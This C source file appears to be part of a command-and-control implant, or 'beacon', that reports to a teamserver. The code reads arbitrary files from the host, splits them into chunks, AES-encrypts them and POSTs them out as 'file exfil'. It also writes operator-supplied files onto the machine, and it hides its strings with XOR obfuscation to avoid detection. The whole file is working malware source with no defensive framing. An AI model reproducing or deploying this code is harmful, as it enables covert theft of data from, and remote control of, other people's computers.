#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <errno.h>
#include "transfer.h"
#include "protocol.h"
#include "beacon.h"
#include "protocol/crypto.h"
#include "comms/http.h"
#include "comms/session.h"
#include "util/obf.h"
#include "obf_strings.h"

/* Send raw bytes (not RUN-REP wrapped) as a result to teamserver.
   Used for file exfil chunks where body = [basename_prefix][file_data]. */
static void send_result_raw(uint32_t beacon_id, uint32_t label,
                            uint8_t type, uint16_t flags, uint32_t identifier,
                            const uint8_t *raw, size_t raw_len,
                            const uint8_t session_key[32],
                            int session_sock) {
    if (session_sock >= 0) {
        send_result_raw_session(session_sock, label, type, flags, identifier,
                                raw, (uint32_t)raw_len, session_key);
        return;
    }

    size_t plain_len = TASK_HEADER_SIZE + raw_len;
    uint8_t *plain = malloc(plain_len);
    if (!plain) return;

    task_header_t hdr = {0};
    hdr.type = type;
    hdr.code = 0;
    hdr.flags = flags;
    hdr.label = label;
    hdr.identifier = identifier;
    hdr.length = (uint32_t)raw_len;
    encode_header(&hdr, plain);
    if (raw_len > 0)
        memcpy(plain + TASK_HEADER_SIZE, raw, raw_len);

    size_t enc_max = plain_len + 48 + 16;
    uint8_t *encrypted = malloc(enc_max);
    if (!encrypted) { free(plain); return; }

    size_t enc_len;
    if (aes_encrypt(session_key, plain, plain_len, encrypted, &enc_len) != 0) {
        free(plain); free(encrypted); return;
    }
    free(plain);

    size_t body_len = 4 + enc_len;
    uint8_t *body = malloc(body_len);
    if (!body) { free(encrypted); return; }

    body[0] = (uint8_t)(beacon_id & 0xFF);
    body[1] = (uint8_t)((beacon_id >> 8) & 0xFF);
    body[2] = (uint8_t)((beacon_id >> 16) & 0xFF);
    body[3] = (uint8_t)((beacon_id >> 24) & 0xFF);
    memcpy(body + 4, encrypted, enc_len);
    free(encrypted);

    char path[64];
    xor_dec(path, ENC_PATH_RESULT, ENC_PATH_RESULT_LEN);

    char _method[ENC_HTTP_POST_LEN + 1];
    xor_dec(_method, ENC_HTTP_POST, ENC_HTTP_POST_LEN);

    uint8_t resp[64];
    http_request(_method, path, body, body_len, resp, sizeof(resp));
    free(body);
}

/* Send error as a RUN-type result (teamserver expects RunRep for errors) */
static void send_error(uint32_t beacon_id, uint32_t label,
                       const char *msg, const uint8_t session_key[32],
                       int session_sock) {
    if (session_sock >= 0) {
        send_result_session(session_sock, label, TASK_RUN, 0,
                            FLAG_ERROR, msg, session_key);
        return;
    }

    uint32_t msg_len = (uint32_t)strlen(msg);
    size_t rep_size = 4 + msg_len;
    size_t plain_len = TASK_HEADER_SIZE + rep_size;
    uint8_t *plain = malloc(plain_len);
    if (!plain) return;

    task_header_t hdr = {0};
    hdr.type = TASK_RUN;
    hdr.code = 0;
    hdr.flags = FLAG_ERROR;
    hdr.label = label;
    hdr.identifier = 0;
    hdr.length = (uint32_t)rep_size;
    encode_header(&hdr, plain);
    encode_run_rep(msg, plain + TASK_HEADER_SIZE, (int *)&rep_size);

    size_t enc_max = plain_len + 48 + 16;
    uint8_t *encrypted = malloc(enc_max);
    if (!encrypted) { free(plain); return; }

    size_t enc_len;
    if (aes_encrypt(session_key, plain, plain_len, encrypted, &enc_len) != 0) {
        free(plain); free(encrypted); return;
    }
    free(plain);

    size_t body_len = 4 + enc_len;
    uint8_t *body = malloc(body_len);
    if (!body) { free(encrypted); return; }

    body[0] = (uint8_t)(beacon_id & 0xFF);
    body[1] = (uint8_t)((beacon_id >> 8) & 0xFF);
    body[2] = (uint8_t)((beacon_id >> 16) & 0xFF);
    body[3] = (uint8_t)((beacon_id >> 24) & 0xFF);
    memcpy(body + 4, encrypted, enc_len);
    free(encrypted);

    char path[64];
    xor_dec(path, ENC_PATH_RESULT, ENC_PATH_RESULT_LEN);

    char _method[ENC_HTTP_POST_LEN + 1];
    xor_dec(_method, ENC_HTTP_POST, ENC_HTTP_POST_LEN);

    uint8_t resp[64];
    http_request(_method, path, body, body_len, resp, sizeof(resp));
    free(body);
}

/* ---- FILE EXFIL (download: beacon → teamserver) ---- */

void handle_file_exfil(uint32_t beacon_id, uint32_t label,
                       const char *src_path,
                       const uint8_t session_key[32],
                       int session_sock) {
    FILE *fp = fopen(src_path, "rb");
    if (!fp) {
        char _fmt[ENC_LX_EXFIL_ERR_OPEN_LEN + 1];
        xor_dec(_fmt, ENC_LX_EXFIL_ERR_OPEN, ENC_LX_EXFIL_ERR_OPEN_LEN);
        char msg[256];
        snprintf(msg, sizeof(msg), _fmt, strerror(errno));
        send_error(beacon_id, label, msg, session_key, session_sock);
        return;
    }

    /* Extract basename */
    const char *basename = src_path;
    for (const char *p = src_path; *p; p++) {
        if (*p == '/') basename = p + 1;
    }
    uint16_t name_len = (uint16_t)strlen(basename);

    /* Get file size */
    struct stat st;
    if (fstat(fileno(fp), &st) != 0) {
        fclose(fp);
        char _stat_err[ENC_LX_EXFIL_ERR_STAT_LEN + 1];
        xor_dec(_stat_err, ENC_LX_EXFIL_ERR_STAT, ENC_LX_EXFIL_ERR_STAT_LEN);
        send_error(beacon_id, label, _stat_err, session_key, session_sock);
        return;
    }
    long long total = st.st_size;
    long long offset = 0;
    uint32_t identifier = 0;

    uint8_t *chunk_buf = malloc(2 + 256 + EXFIL_CHUNK_SIZE);
    if (!chunk_buf) { fclose(fp); return; }

    /* Empty file: single chunk with just basename prefix */
    if (total == 0) {
        chunk_buf[0] = (uint8_t)(name_len & 0xFF);
        chunk_buf[1] = (uint8_t)((name_len >> 8) & 0xFF);
        memcpy(chunk_buf + 2, basename, name_len);
        send_result_raw(beacon_id, label, TASK_FILE_EXFIL, FLAG_LAST_FRAG, 0,
                        chunk_buf, 2 + name_len, session_key, session_sock);
        free(chunk_buf);
        fclose(fp);
        return;
    }

    while (offset < total) {
        uint32_t prefix = 0;
        if (identifier == 0) {
            chunk_buf[0] = (uint8_t)(name_len & 0xFF);
            chunk_buf[1] = (uint8_t)((name_len >> 8) & 0xFF);
            memcpy(chunk_buf + 2, basename, name_len);
            prefix = 2 + name_len;
        }

        uint32_t to_read = EXFIL_CHUNK_SIZE;
        if ((long long)to_read > total - offset)
            to_read = (uint32_t)(total - offset);

        size_t bytes_read = fread(chunk_buf + prefix, 1, to_read, fp);
        if (bytes_read == 0) {
            char _rfmt[ENC_LX_EXFIL_ERR_READ_LEN + 1];
            xor_dec(_rfmt, ENC_LX_EXFIL_ERR_READ, ENC_LX_EXFIL_ERR_READ_LEN);
            char msg[256];
            snprintf(msg, sizeof(msg), _rfmt, strerror(errno));
            send_error(beacon_id, label, msg, session_key, session_sock);
            break;
        }

        offset += (long long)bytes_read;
        uint16_t flags = (offset >= total) ? FLAG_LAST_FRAG : FLAG_FRAGMENTED;

        send_result_raw(beacon_id, label, TASK_FILE_EXFIL, flags, identifier,
                        chunk_buf, prefix + bytes_read, session_key, session_sock);
        identifier++;
    }

    free(chunk_buf);
    fclose(fp);
}

/* ---- FILE STAGE (upload: teamserver → beacon) ---- */

typedef struct {
    uint32_t label;
    FILE    *fp;
    int      active;
    char     dest_path[4096];
} stage_slot_t;

static stage_slot_t stage_slots[MAX_STAGE_SLOTS];

static int path_has_traversal(const char *path) {
    for (const char *p = path; *p; p++) {
        if (p[0] == '.' && p[1] == '.' &&
            (p[2] == '/' || p[2] == '\0'))
            return 1;
    }
    return 0;
}

void handle_file_stage(uint32_t beacon_id, uint32_t label,
                       uint32_t identifier, uint16_t flags,
                       const uint8_t *data, uint32_t len,
                       const uint8_t session_key[32],
                       int session_sock) {
    stage_slot_t *slot = NULL;

    if (identifier == 0) {
        for (int i = 0; i < MAX_STAGE_SLOTS; i++) {
            if (!stage_slots[i].active) { slot = &stage_slots[i]; break; }
        }
        if (!slot) { return; }

        if (len < 2) { return; }
        uint16_t path_len = (uint16_t)data[0] | ((uint16_t)data[1] << 8);
        if ((uint32_t)path_len + 2 > len) { return; }

        char dest_path[4096] = {0};
        uint32_t copy_len = path_len < sizeof(dest_path) - 1 ? path_len : sizeof(dest_path) - 1;
        memcpy(dest_path, data + 2, copy_len);

        if (path_has_traversal(dest_path)) { return; }

        FILE *fp = fopen(dest_path, "wb");
        if (!fp) {
            char _sfmt[ENC_LX_STAGE_ERR_CREATE_LEN + 1];
            xor_dec(_sfmt, ENC_LX_STAGE_ERR_CREATE, ENC_LX_STAGE_ERR_CREATE_LEN);
            char msg[512];
            snprintf(msg, sizeof(msg), _sfmt, dest_path, strerror(errno));
            send_error(beacon_id, label, msg, session_key, session_sock);
            return;
        }

        slot->label  = label;
        slot->fp     = fp;
        slot->active = 1;
        memcpy(slot->dest_path, dest_path, copy_len);
        slot->dest_path[copy_len] = '\0';

        const uint8_t *chunk = data + 2 + path_len;
        uint32_t chunk_len   = len  - 2 - path_len;
        if (chunk_len > 0) {
            size_t w = fwrite(chunk, 1, chunk_len, fp);
            if (w != chunk_len) {
                fclose(fp);
                slot->active = 0;
                return;
            }
        }
    } else {
        for (int i = 0; i < MAX_STAGE_SLOTS; i++) {
            if (stage_slots[i].active && stage_slots[i].label == label) {
                slot = &stage_slots[i]; break;
            }
        }
        if (!slot) { return; }

        if (len > 0) {
            size_t w = fwrite(data, 1, len, slot->fp);
            if (w != len) {
                fclose(slot->fp);
                slot->active = 0;
                return;
            }
        }
    }

    if (slot && (flags & FLAG_LAST_FRAG)) {
        fclose(slot->fp);

        /* Send confirmation: RUN-REP with dest_path */
        uint32_t msg_len = (uint32_t)strlen(slot->dest_path);
        uint8_t *rep = malloc(4 + msg_len);
        if (rep) {
            rep[0] = (uint8_t)(msg_len & 0xFF);
            rep[1] = (uint8_t)((msg_len >> 8) & 0xFF);
            rep[2] = (uint8_t)((msg_len >> 16) & 0xFF);
            rep[3] = (uint8_t)((msg_len >> 24) & 0xFF);
            memcpy(rep + 4, slot->dest_path, msg_len);
            send_result_raw(beacon_id, label, TASK_FILE_STAGE, FLAG_NONE, 0,
                            rep, 4 + msg_len, session_key, session_sock);
            free(rep);
        }

        slot->fp     = NULL;
        slot->active = 0;
        slot->label  = 0;
        slot->dest_path[0] = '\0';
    }
}
